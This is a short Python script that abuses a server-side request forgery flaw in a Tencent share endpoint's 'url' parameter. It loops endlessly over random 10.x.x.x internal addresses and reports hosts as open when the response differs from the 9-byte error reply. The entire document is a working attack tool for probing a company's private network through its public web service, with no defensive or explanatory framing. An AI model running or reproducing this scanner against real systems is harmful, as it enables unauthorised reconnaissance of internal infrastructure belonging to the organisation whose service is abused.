import requests
  
import time
  
import random
  

  
port = '80'
  

  
# random fuzz local ip
  
while True:
  
    ip = '10.{0}.{1}.{2}'.format(random.randint(1, 254),random.randint(1, 254),random.randint(1, 254))
  
    payload = 'http://{ip}:80/'.format(ip=ip)
  
    url = 'http://share.v.t.qq.com/index.php?c=share&a=pageinfo&url={payload}'.format(
  
        payload=payload)
  
    # len({"ret":1}) == 9
  
    if len(requests.get(url).content) != 9:
  
        print ip, port, 'OPEN', requests.get(url).content
